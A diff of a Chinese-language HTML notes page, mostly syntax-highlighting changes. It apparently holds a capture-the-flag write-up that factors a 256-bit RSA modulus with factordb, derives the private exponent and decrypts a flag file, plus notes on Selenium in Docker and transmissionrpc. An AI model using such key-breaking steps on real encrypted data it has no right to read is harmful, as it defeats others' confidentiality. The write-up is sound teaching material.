+<span class="s">e+fuqvuwBPUfAgMBAAE=</span><span class="w"></span>
+<span class="gh">-----END PUBLIC KEY-----</span><span class="w"></span>
 </code></pre></div>
-
 
 <p>看起来很短，估计是可以分解的比较小的N</p>
 <p>google搜索关键词：openssl get n from public key</p>
 <p>参考：https://stackoverflow.com/questions/3116907/rsa-get-exponent-and-modulus-given-a-public-key</p>
 <p>人家给出了这样的做法：(环境Linux，已经安装openssl)</p>
-<div class="codehilite"><pre><span></span><code><span class="err"># 丢弃头尾的---行，提取公钥内容并合并一行（这是base64编码的字符串）</span>
-<span class="err">PUBKEY=`grep -v -- ----- public.pem | tr -d &#39;\n&#39;`</span>
-<span class="err"># 编码格式是asn1，查看这种编码的格式</span>
-<span class="err">echo $PUBKEY | base64 -d | openssl asn1parse -inform DER -i</span>
+<div class="codehilite"><pre><span></span><code># 丢弃头尾的---行，提取公钥内容并合并一行（这是base64编码的字符串）
+PUBKEY=`grep -v -- ----- public.pem | tr -d &#39;\n&#39;`
+# 编码格式是asn1，查看这种编码的格式
+echo $PUBKEY | base64 -d | openssl asn1parse -inform DER -i
 </code></pre></div>
-
 
 <p>将输出：</p>
-<div class="codehilite"><pre><span></span><code><span class="err">    0:d=0  hl=2 l=  60 cons: SEQUENCE</span>
-<span class="err">    2:d=1  hl=2 l=  13 cons:  SEQUENCE</span>
-<span class="err">    4:d=2  hl=2 l=   9 prim:   OBJECT            :rsaEncryption</span>
-<span class="err">   15:d=2  hl=2 l=   0 prim:   NULL</span>
-<span class="err">   17:d=1  hl=2 l=  43 prim:  BIT STRING</span>
+<div class="codehilite"><pre><span></span><code>    0:d=0  hl=2 l=  60 cons: SEQUENCE
+    2:d=1  hl=2 l=  13 cons:  SEQUENCE
+    4:d=2  hl=2 l=   9 prim:   OBJECT            :rsaEncryption
+   15:d=2  hl=2 l=   0 prim:   NULL
+   17:d=1  hl=2 l=  43 prim:  BIT STRING
 </code></pre></div>
-
 
 <p>最后一行BIT STRING就是数据所在的位置，偏移为17</p>
 <p>提取出来：</p>
-<div class="codehilite"><pre><span></span><code><span class="err">echo $PUBKEY | base64 -d | openssl asn1parse -inform DER -i -strparse 17</span>
+<div class="codehilite"><pre><span></span><code>echo $PUBKEY | base64 -d | openssl asn1parse -inform DER -i -strparse 17
 </code></pre></div>
-
 
 <p>得到：</p>
-<div class="codehilite"><pre><span></span><code><span class="err">    0:d=0  hl=2 l=  40 cons: SEQUENCE</span>
-<span class="err">    2:d=1  hl=2 l=  33 prim:  INTEGER           :C8151EFEBB0C23FAA11022409C5A12E4A5B96984E6265B7BE7EEAAFBB004F51F</span>
-<span class="err">   37:d=1  hl=2 l=   3 prim:  INTEGER           :010001</span>
+<div class="codehilite"><pre><span></span><code>    0:d=0  hl=2 l=  40 cons: SEQUENCE
+    2:d=1  hl=2 l=  33 prim:  INTEGER           :C8151EFEBB0C23FAA11022409C5A12E4A5B96984E6265B7BE7EEAAFBB004F51F
+   37:d=1  hl=2 l=   3 prim:  INTEGER           :010001
 </code></pre></div>
-
 
 <p>嗯~这样就看到十六进制的n和e啦，转为十进制的话python里面直接输入:</p>
-<div class="codehilite"><pre><span></span><code><span class="err">n = 0xC8151EFEBB0C23FAA11022409C5A12E4A5B96984E6265B7BE7EEAAFBB004F51F</span>
-<span class="err">print(n) </span>
+<div class="codehilite"><pre><span></span><code>n = 0xC8151EFEBB0C23FAA11022409C5A12E4A5B96984E6265B7BE7EEAAFBB004F51F
+print(n) 
 </code></pre></div>
-
 
 <p>上述python执行后将输出</p>
 <p>90499887424928873790510606439768063703452393541528122252967476339871041516831</p>
@@ -2757,9 +2710,8 @@
 <p>打开factordb.com这个神奇的网站，输入n的值就能查到分解结果啦：</p>
 <p>http://factordb.com/index.php?query=90499887424928873790510606439768063703452393541528122252967476339871041516831</p>
 <p>分解结果：</p>
-<div class="codehilite"><pre><span></span><code><span class="err">9049988742...31&lt;77&gt; = 283194537446483890135816972554288437117&lt;39&gt; · 319567913424286672035093410391626922443&lt;39&gt;</span>
+<div class="codehilite"><pre><span></span><code><span class="mf">9049988742...31</span><span class="o">&lt;</span><span class="mf">77</span><span class="o">&gt;</span> <span class="o">=</span> <span class="mf">283194537446483890135816972554288437117</span><span class="o">&lt;</span><span class="mf">39</span><span class="o">&gt;</span> <span class="err">·</span> <span class="mf">319567913424286672035093410391626922443</span><span class="o">&lt;</span><span class="mf">39</span><span class="o">&gt;</span>
 </code></pre></div>
-
 
 <p>好了，我们就知道 p q了，具体哪个是p哪个是q并不重要</p>
 <p>p=283194537446483890135816972554288437117, q=319567913424286672035093410391626922443</p>
@@ -2770,48 +2722,46 @@
 <p>google关键词： python calculate inverse mod</p>
 <p>参考：https://stackoverflow.com/questions/4798654/modular-multiplicative-inverse-function-in-python</p>
 <p>得到代码：</p>
-<div class="codehilite"><pre><span></span><code><span class="n">def</span> <span class="n">egcd</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">):</span>
-    <span class="k">if</span> <span class="n">a</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
-        <span class="k">return</span> <span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
-    <span class="k">else</span><span class="p">:</span>
-        <span class="k">g</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">x</span> <span class="o">=</span> <span class="n">egcd</span><span class="p">(</span><span class="n">b</span> <span class="o">%</span> <span class="n">a</span><span class="p">,</span> <span class="n">a</span><span class="p">)</span>
-        <span class="k">return</span> <span class="p">(</span><span class="k">g</span><span class="p">,</span> <span class="n">x</span> <span class="o">-</span> <span class="p">(</span><span class="n">b</span> <span class="o">//</span> <span class="n">a</span><span class="p">)</span> <span class="o">*</span> <span class="n">y</span><span class="p">,</span> <span class="n">y</span><span class="p">)</span>
+<div class="codehilite"><pre><span></span><code><span class="nv">def</span> <span class="nv">egcd</span><span class="ss">(</span><span class="nv">a</span>, <span class="nv">b</span><span class="ss">)</span>:
+    <span class="k">if</span> <span class="nv">a</span> <span class="o">==</span> <span class="mi">0</span>:
+        <span class="k">return</span> <span class="ss">(</span><span class="nv">b</span>, <span class="mi">0</span>, <span class="mi">1</span><span class="ss">)</span>
+    <span class="k">else</span>:
+        <span class="nv">g</span>, <span class="nv">y</span>, <span class="nv">x</span> <span class="o">=</span> <span class="nv">egcd</span><span class="ss">(</span><span class="nv">b</span> <span class="o">%</span> <span class="nv">a</span>, <span class="nv">a</span><span class="ss">)</span>
+        <span class="k">return</span> <span class="ss">(</span><span class="nv">g</span>, <span class="nv">x</span> <span class="o">-</span> <span class="ss">(</span><span class="nv">b</span> <span class="o">//</span> <span class="nv">a</span><span class="ss">)</span> <span class="o">*</span> <span class="nv">y</span>, <span class="nv">y</span><span class="ss">)</span>
 
-<span class="n">def</span> <span class="n">modinv</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">m</span><span class="p">):</span>
-    <span class="k">g</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span> <span class="o">=</span> <span class="n">egcd</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">m</span><span class="p">)</span>
-    <span class="k">if</span> <span class="k">g</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">:</span>
-        <span class="n">raise</span> <span class="k">Exception</span><span class="p">(</span><span class="s1">&#39;modular inverse does not exist&#39;</span><span class="p">)</span>
-    <span class="k">else</span><span class="p">:</span>
-        <span class="k">return</span> <span class="n">x</span> <span class="o">%</span> <span class="n">m</span>
+<span class="nv">def</span> <span class="nv">modinv</span><span class="ss">(</span><span class="nv">a</span>, <span class="nv">m</span><span class="ss">)</span>:
+    <span class="nv">g</span>, <span class="nv">x</span>, <span class="nv">y</span> <span class="o">=</span> <span class="nv">egcd</span><span class="ss">(</span><span class="nv">a</span>, <span class="nv">m</span><span class="ss">)</span>
+    <span class="k">if</span> <span class="nv">g</span> <span class="o">!=</span> <span class="mi">1</span>:
+        <span class="nv">raise</span> <span class="nv">Exception</span><span class="ss">(</span><span class="s1">&#39;</span><span class="s">modular inverse does not exist</span><span class="s1">&#39;</span><span class="ss">)</span>
+    <span class="k">else</span>:
+        <span class="k">return</span> <span class="nv">x</span> <span class="o">%</span> <span class="nv">m</span>
 </code></pre></div>
-
 
 <p>看不懂这代码在干啥？我也看不懂，但没关系，直接用就行 这么多人点赞肯定是对的</p>
 <p>那现在就着手把这代码搬运到我们的py中咯：</p>
-<div class="codehilite"><pre><span></span><code><span class="n">N</span> <span class="o">=</span> <span class="mi">0</span><span class="n">xC8151EFEBB0C23FAA11022409C5A12E4A5B96984E6265B7BE7EEAAFBB004F51F</span>
-<span class="n">e</span> <span class="o">=</span> <span class="mi">0</span><span class="n">x10001</span>
+<div class="codehilite"><pre><span></span><code><span class="nv">N</span> <span class="o">=</span> <span class="mi">0</span><span class="nv">xC8151EFEBB0C23FAA11022409C5A12E4A5B96984E6265B7BE7EEAAFBB004F51F</span>
+<span class="nv">e</span> <span class="o">=</span> <span class="mi">0</span><span class="nv">x10001</span>
 
-<span class="n">p</span> <span class="o">=</span> <span class="mi">283194537446483890135816972554288437117</span>
-<span class="n">q</span> <span class="o">=</span> <span class="mi">319567913424286672035093410391626922443</span>
+<span class="nv">p</span> <span class="o">=</span> <span class="mi">283194537446483890135816972554288437117</span>
+<span class="nv">q</span> <span class="o">=</span> <span class="mi">319567913424286672035093410391626922443</span>
 
-<span class="n">def</span> <span class="n">egcd</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">):</span>
-    <span class="k">if</span> <span class="n">a</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
-        <span class="k">return</span> <span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
-    <span class="k">else</span><span class="p">:</span>
-        <span class="k">g</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">x</span> <span class="o">=</span> <span class="n">egcd</span><span class="p">(</span><span class="n">b</span> <span class="o">%</span> <span class="n">a</span><span class="p">,</span> <span class="n">a</span><span class="p">)</span>
-        <span class="k">return</span> <span class="p">(</span><span class="k">g</span><span class="p">,</span> <span class="n">x</span> <span class="o">-</span> <span class="p">(</span><span class="n">b</span> <span class="o">//</span> <span class="n">a</span><span class="p">)</span> <span class="o">*</span> <span class="n">y</span><span class="p">,</span> <span class="n">y</span><span class="p">)</span>
+<span class="nv">def</span> <span class="nv">egcd</span><span class="ss">(</span><span class="nv">a</span>, <span class="nv">b</span><span class="ss">)</span>:
+    <span class="k">if</span> <span class="nv">a</span> <span class="o">==</span> <span class="mi">0</span>:
+        <span class="k">return</span> <span class="ss">(</span><span class="nv">b</span>, <span class="mi">0</span>, <span class="mi">1</span><span class="ss">)</span>
+    <span class="k">else</span>:
+        <span class="nv">g</span>, <span class="nv">y</span>, <span class="nv">x</span> <span class="o">=</span> <span class="nv">egcd</span><span class="ss">(</span><span class="nv">b</span> <span class="o">%</span> <span class="nv">a</span>, <span class="nv">a</span><span class="ss">)</span>
+        <span class="k">return</span> <span class="ss">(</span><span class="nv">g</span>, <span class="nv">x</span> <span class="o">-</span> <span class="ss">(</span><span class="nv">b</span> <span class="o">//</span> <span class="nv">a</span><span class="ss">)</span> <span class="o">*</span> <span class="nv">y</span>, <span class="nv">y</span><span class="ss">)</span>
 
-<span class="n">def</span> <span class="n">modinv</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">m</span><span class="p">):</span>
-    <span class="k">g</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span> <span class="o">=</span> <span class="n">egcd</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">m</span><span class="p">)</span>
-    <span class="k">if</span> <span class="k">g</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">:</span>
-        <span class="n">raise</span> <span class="k">Exception</span><span class="p">(</span><span class="s1">&#39;modular inverse does not exist&#39;</span><span class="p">)</span>
-    <span class="k">else</span><span class="p">:</span>
-        <span class="k">return</span> <span class="n">x</span> <span class="o">%</span> <span class="n">m</span>
+<span class="nv">def</span> <span class="nv">modinv</span><span class="ss">(</span><span class="nv">a</span>, <span class="nv">m</span><span class="ss">)</span>:
+    <span class="nv">g</span>, <span class="nv">x</span>, <span class="nv">y</span> <span class="o">=</span> <span class="nv">egcd</span><span class="ss">(</span><span class="nv">a</span>, <span class="nv">m</span><span class="ss">)</span>
+    <span class="k">if</span> <span class="nv">g</span> <span class="o">!=</span> <span class="mi">1</span>:
+        <span class="nv">raise</span> <span class="nv">Exception</span><span class="ss">(</span><span class="s1">&#39;</span><span class="s">modular inverse does not exist</span><span class="s1">&#39;</span><span class="ss">)</span>
+    <span class="k">else</span>:
+        <span class="k">return</span> <span class="nv">x</span> <span class="o">%</span> <span class="nv">m</span>
 
-<span class="n">d</span> <span class="o">=</span> <span class="n">modinv</span><span class="p">(</span><span class="n">e</span><span class="p">,</span> <span class="p">(</span><span class="n">p</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">q</span><span class="o">-</span><span class="mi">1</span><span class="p">))</span>
-<span class="n">print</span><span class="p">(</span><span class="n">d</span><span class="p">)</span>
+<span class="nv">d</span> <span class="o">=</span> <span class="nv">modinv</span><span class="ss">(</span><span class="nv">e</span>, <span class="ss">(</span><span class="nv">p</span><span class="o">-</span><span class="mi">1</span><span class="ss">)</span><span class="o">*</span><span class="ss">(</span><span class="nv">q</span><span class="o">-</span><span class="mi">1</span><span class="ss">))</span>
+<span class="nv">print</span><span class="ss">(</span><span class="nv">d</span><span class="ss">)</span>
 </code></pre></div>
-
 
 <p>上述python将输出34458919248694250828820386546500026880096887166581679876896066449320377773297， 真是一个好大的d啊。。。</p>
 <h4 id="flagencint">怎么把flag.enc当成一个int读入？<a class="headerlink" href="#flagencint" title="Permanent link">&para;</a></h4>
@@ -2821,32 +2771,28 @@
 <p>google关键词： python byte string to int</p>
 <p>参考：https://stackoverflow.com/questions/444591/convert-a-string-of-bytes-into-an-int-python</p>
 <p>人家给出了python3.2以后可以用int.from_bytes的方式，继续写我们的py咯：</p>
-<div class="codehilite"><pre><span></span><code><span class="err">encrypteddata = open(&#39;flag.enc&#39;,&#39;rb&#39;).read()</span>
-<span class="err">c = int.from_bytes(encrypteddata, &#39;big&#39;)</span>
-<span class="err">print(c)</span>
+<div class="codehilite"><pre><span></span><code>encrypteddata = open(&#39;flag.enc&#39;,&#39;rb&#39;).read()
+c = int.from_bytes(encrypteddata, &#39;big&#39;)
+print(c)
 </code></pre></div>
-
 
 <p>这里的&rsquo;big&rsquo;表示大端存放的方式，就是最重要的那一位是靠左边的</p>
 <p>插一句：通过询问其他大佬，我也折腾出了一种naive的方法——使用binascii模块先转为hex编码，然后hex按16字节转int:</p>
 <div class="codehilite"><pre><span></span><code><span class="n">encrypteddata</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;flag.enc&#39;</span><span class="p">,</span><span class="s1">&#39;rb&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
 <span class="kn">import</span> <span class="nn">binascii</span>
 <span class="n">c</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">binascii</span><span class="o">.</span><span class="n">b2a_hex</span><span class="p">(</span><span class="n">encrypteddata</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(),</span><span class="mi">16</span><span class="p">)</span>
-<span class="k">print</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
 </code></pre></div>
-
 
 <h4 id="_11">计算明文<a class="headerlink" href="#_11" title="Permanent link">&para;</a></h4>
 <p>公式（密码学肯定要考的，所以再记一次咯）</p>
-<div class="codehilite"><pre><span></span><code><span class="err">m = c^d (mod n)</span>
+<div class="codehilite"><pre><span></span><code>m = c^d (mod n)
 </code></pre></div>
-
 
 <p>问题来了，d是个那么大的数，如果直接写一个：</p>
-<div class="codehilite"><pre><span></span><code><span class="err"># 在python里**表示乘方</span>
-<span class="err">m = (c**d)%n</span>
+<div class="codehilite"><pre><span></span><code># 在python里**表示乘方
+m = (c**d)%n
 </code></pre></div>
-
 
 <p>果然运行这个py就卡死了，实际上并没有必要算出精确的c**d，我们需要调用快速的mod乘方的方法</p>
 <p>google关键词： python mod pow</p>
@@ -2857,55 +2803,48 @@
 <span class="n">m</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">n</span><span class="p">)</span>
 </code></pre></div>
 
-
 <p>然而命途多舛，果然报错：</p>
-<div class="codehilite"><pre><span></span><code><span class="err">Traceback (most recent call last):</span>
-<span class="err">  File &quot;run.py&quot;, line 35, in &lt;module&gt;</span>
-<span class="err">    m = pow(c,d,n)</span>
-<span class="c">TypeError: pow expected 2 arguments, got 3</span>
+<div class="codehilite"><pre><span></span><code>Traceback (most recent call last):
+  File &quot;run.py&quot;, line 35, in &lt;module&gt;
+    m = pow(c,d,n)
+TypeError: pow expected 2 arguments, got 3
 </code></pre></div>
-
 
 <p>emmm&hellip; 奇了怪了，这是什么鬼嘛，说好的支持第三个参数呢，翻回去仔细看人家给的<a href="https://docs.python.org/3/library/functions.html#pow">文档链接</a></p>
 <p>嗯？这文档的标题就是Built-in Functions，我懂了！ 支持第三个参数的pow函数是内置的那个，而不是math库提供的，删掉<code>from math import pow</code>这一句就好了</p>
 <p>我们的py又加上了两行：</p>
-<div class="codehilite"><pre><span></span><code><span class="err">m = pow(c,d,n)</span>
-<span class="err">print(m)</span>
+<div class="codehilite"><pre><span></span><code>m = pow(c,d,n)
+print(m)
 </code></pre></div>
-
 
 <p>得到输出 4114174865819530012247735243997890458185276719507135882385278623252053258</p>
 <h3 id="flag">明文这么一个大数 我要的flag呢？<a class="headerlink" href="#flag" title="Permanent link">&para;</a></h3>
 <p>cy打开了他的笔记本 <a href="https://py3.io/Python.html#bytes">https://py3.io/Python.html#bytes</a></p>
 <p>查到了 十六进制字符串转bytes字符串 和 拿到一个int转字符串 的方法：</p>
 <div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b16decode</span>
-<span class="k">print</span><span class="p">(</span> <span class="n">b16decode</span><span class="p">(</span> <span class="nb">hex</span><span class="p">(</span><span class="n">m</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">upper</span><span class="p">()</span> <span class="p">)</span> <span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span> <span class="n">b16decode</span><span class="p">(</span> <span class="nb">hex</span><span class="p">(</span><span class="n">m</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">upper</span><span class="p">()</span> <span class="p">)</span> <span class="p">)</span>
 </code></pre></div>
-
 
 <p>果然 又tm出错了：</p>
-<div class="codehilite"><pre><span></span><code><span class="err">Traceback (most recent call last):</span>
-<span class="err">  File &quot;run.py&quot;, line 37, in &lt;module&gt;</span>
-<span class="err">    print( b16decode( hex(m)[2:].upper() ) )</span>
-<span class="err">  File &quot;/usr/lib/python3.5/base64.py&quot;, line 276, in b16decode</span>
-<span class="err">    return binascii.unhexlify(s)</span>
-<span class="err">binascii.Error: Odd-length string</span>
+<div class="codehilite"><pre><span></span><code><span class="nv">Traceback</span> <span class="ss">(</span><span class="nv">most</span> <span class="nv">recent</span> <span class="k">call</span> <span class="nl">last</span><span class="ss">)</span>:
+  <span class="nv">File</span> <span class="s2">&quot;</span><span class="s">run.py</span><span class="s2">&quot;</span>, <span class="nv">line</span> <span class="mi">37</span>, <span class="nv">in</span> <span class="o">&lt;</span><span class="nv">module</span><span class="o">&gt;</span>
+    <span class="nv">print</span><span class="ss">(</span> <span class="nv">b16decode</span><span class="ss">(</span> <span class="nv">hex</span><span class="ss">(</span><span class="nv">m</span><span class="ss">)</span>[<span class="mi">2</span>:].<span class="nv">upper</span><span class="ss">()</span> <span class="ss">)</span> <span class="ss">)</span>
+  <span class="nv">File</span> <span class="s2">&quot;</span><span class="s">/usr/lib/python3.5/base64.py</span><span class="s2">&quot;</span>, <span class="nv">line</span> <span class="mi">276</span>, <span class="nv">in</span> <span class="nv">b16decode</span>
+    <span class="k">return</span> <span class="nv">binascii</span>.<span class="nv">unhexlify</span><span class="ss">(</span><span class="nv">s</span><span class="ss">)</span>
+<span class="nv">binascii</span>.<span class="nv">Error</span>: <span class="nv">Odd</span><span class="o">-</span><span class="nv">length</span> <span class="nv">string</span>
 </code></pre></div>
-
 
 <p>odd-length啥意思？奇数长度？对噢 十六进制字符串肯定要偶数长度才行（两个一组表示一个字节嘛） 那么就前面补个0咯</p>
 <p>py代码如下：（其实你也可以试试int.to_bytes方法）</p>
-<div class="codehilite"><pre><span></span><code><span class="err">plaindata = hex(m)[2:].upper()</span>
-<span class="err">if len(plaindata)%2 :</span>
-<span class="err">    plaindata = &quot;0&quot;+plaindata</span>
-<span class="err">print(b16decode(plaindata))</span>
+<div class="codehilite"><pre><span></span><code><span class="nv">plaindata</span> <span class="o">=</span> <span class="nv">hex</span><span class="ss">(</span><span class="nv">m</span><span class="ss">)</span>[<span class="mi">2</span>:].<span class="nv">upper</span><span class="ss">()</span>
+<span class="k">if</span> <span class="nv">len</span><span class="ss">(</span><span class="nv">plaindata</span><span class="ss">)</span><span class="o">%</span><span class="mi">2</span> :
+    <span class="nv">plaindata</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="s">0</span><span class="s2">&quot;</span><span class="o">+</span><span class="nv">plaindata</span>
+<span class="nv">print</span><span class="ss">(</span><span class="nv">b16decode</span><span class="ss">(</span><span class="nv">plaindata</span><span class="ss">))</span>
 </code></pre></div>
-
 
 <p>输出：</p>
-<div class="codehilite"><pre><span></span><code><span class="err">b&#39;\x02T\x1b:(\x02\xb9\x8c8\xbb\x00CTF{256i3_n0t_SAfe}\n&#39;</span>
+<div class="codehilite"><pre><span></span><code>b&#39;\x02T\x1b:(\x02\xb9\x8c8\xbb\x00CTF{256i3_n0t_SAfe}\n&#39;
 </code></pre></div>
-
 
 <p>啊哈！ 总算能搞定啦，flag到手！</p>
 <h3 id="_12">完整的代码<a class="headerlink" href="#_12" title="Permanent link">&para;</a></h3>
@@ -2917,7 +2856,7 @@
 
 <span class="n">n</span> <span class="o">=</span> <span class="mh">0xC8151EFEBB0C23FAA11022409C5A12E4A5B96984E6265B7BE7EEAAFBB004F51F</span>
 <span class="n">e</span> <span class="o">=</span> <span class="mh">0x10001</span>
-<span class="k">print</span><span class="p">(</span><span class="n">n</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">n</span><span class="p">)</span>
 <span class="c1"># visit http://factordb.com/index.php?query=90499887424928873790510606439768063703452393541528122252967476339871041516831</span>
 <span class="n">p</span> <span class="o">=</span> <span class="mi">283194537446483890135816972554288437117</span>
 <span class="n">q</span> <span class="o">=</span> <span class="mi">319567913424286672035093410391626922443</span>
@@ -2936,23 +2875,22 @@
     <span class="k">else</span><span class="p">:</span>
         <span class="k">return</span> <span class="n">x</span> <span class="o">%</span> <span class="n">m</span>
 <span class="n">d</span> <span class="o">=</span> <span class="n">modinv</span><span class="p">(</span><span class="n">e</span><span class="p">,</span> <span class="p">(</span><span class="n">p</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">q</span><span class="o">-</span><span class="mi">1</span><span class="p">))</span>
-<span class="k">print</span><span class="p">(</span><span class="n">d</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">d</span><span class="p">)</span>
 <span class="n">encrypteddata</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;flag.enc&#39;</span><span class="p">,</span><span class="s1">&#39;rb&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
 <span class="kn">import</span> <span class="nn">binascii</span>
 <span class="n">c</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">binascii</span><span class="o">.</span><span class="n">b2a_hex</span><span class="p">(</span><span class="n">encrypteddata</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(),</span><span class="mi">16</span><span class="p">)</span>
-<span class="k">print</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
 <span class="n">c</span> <span class="o">=</span> <span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">encrypteddata</span><span class="p">,</span> <span class="s1">&#39;big&#39;</span><span class="p">)</span>
-<span class="k">print</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
 <span class="n">m</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">n</span><span class="p">)</span>
-<span class="k">print</span><span class="p">(</span><span class="n">m</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">m</span><span class="p">)</span>
 <span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b16decode</span>
 <span class="n">plaindata</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="n">m</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">upper</span><span class="p">()</span>
 <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">plaindata</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span> <span class="p">:</span>
     <span class="n">plaindata</span> <span class="o">=</span> <span class="s2">&quot;0&quot;</span><span class="o">+</span><span class="n">plaindata</span>
 
-<span class="k">print</span><span class="p">(</span><span class="n">b16decode</span><span class="p">(</span><span class="n">plaindata</span><span class="p">))</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">b16decode</span><span class="p">(</span><span class="n">plaindata</span><span class="p">))</span>
 </code></pre></div>
-
 
 <hr />
 <h2 id="_13">时间戳与字符串相互转换<a class="headerlink" href="#_13" title="Permanent link">&para;</a></h2>
@@ -3003,7 +2941,6 @@
 <span class="k">assert</span> <span class="n">USERS</span><span class="o">==</span><span class="n">USERS2</span> <span class="c1">#存进去的与取出来的应该相同</span>
 </code></pre></div>
 
-
 <hr />
 <h2 id="nexushd">搬运种子 从北邮人搬运到NexusHD<a class="headerlink" href="#nexushd" title="Permanent link">&para;</a></h2>
 <p>代码： <a href="../code/autoseed_byr2nhd.py">code/autoseed_byr2nhd.py</a></p>
@@ -3016,9 +2953,8 @@
 <p>运行环境：只需要Docker和Python3，无需桌面环境</p>
 <p>镜像参考：https://hub.docker.com/r/selenium/standalone-chrome/</p>
 <p>先跑起来容器呗，这样就运行了selenium server，主机暴露了一个6666端口，：</p>
-<div class="codehilite"><pre><span></span><code><span class="err">docker run -d -p 6666:4444 -v /dev/shm:/dev/shm selenium/standalone-chrome</span>
+<div class="codehilite"><pre><span></span><code>docker run -d -p 6666:4444 -v /dev/shm:/dev/shm selenium/standalone-chrome
 </code></pre></div>
-
 
 <p>安装Python包：<code>pip3 install selenium</code></p>
 <p>调用代码，爬取url，得到网页源代码，其中127.0.0.1相应地修改为Docker主机的IP:</p>
@@ -3035,7 +2971,6 @@
         <span class="n">fp</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">html</span><span class="p">)</span>
 <span class="n">driver</span><span class="o">.</span><span class="n">quit</span><span class="p">()</span> <span class="c1">#一定要记得清理掉Chrome进程 否则内存会占满</span>
 </code></pre></div>
-
 
 <p>如果没有在代码里面清理Chrome进程，可以在浏览器里面进入Console，在这里可以看到当前运行的Session (Chrome进程) ，对当前页面查看页面截图：
 http://127.0.0.1:6666/wd/hub/static/resource/hub.html</p>
@@ -3062,7 +2997,6 @@ http://127.0.0.1:6666/wd/hub/static/resource/hub.html</p>
     <span class="n">os</span><span class="o">.</span><span class="n">setuid</span><span class="p">(</span><span class="n">running_uid</span><span class="p">)</span>
 </code></pre></div>
 
-
 <hr />
 <h2 id="python-transmissionrpc">python transmissionrpc<a class="headerlink" href="#python-transmissionrpc" title="Permanent link">&para;</a></h2>
 <p>下述主要介绍<a href="https://pythonhosted.org/transmissionrpc/">transmissionrpc</a>这个库的使用</p>
@@ -3073,25 +3007,21 @@ http://127.0.0.1:6666/wd/hub/static/resource/hub.html</p>
     <span class="k">return</span> <span class="n">tc</span><span class="o">.</span><span class="n">add_torrent</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s2">&quot;rb&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
 </code></pre></div>
 
-
 <p>返回值是一个不完整的torrent对象</p>
 <h3 id="torrent">获取完整的torrent对象<a class="headerlink" href="#torrent" title="Permanent link">&para;</a></h3>
-<div class="codehilite"><pre><span></span><code><span class="err">torrent_id = torrent.id</span>
-<span class="err">full_torrent = tc.get_torrent(torrent_id)</span>
+<div class="codehilite"><pre><span></span><code>torrent_id = torrent.id
+full_torrent = tc.get_torrent(torrent_id)
 </code></pre></div>
-
 
 <p>其中就有状态和进度信息</p>
-<div class="codehilite"><pre><span></span><code><span class="err">print(full_torrent.status, full_torrent.progress)</span>
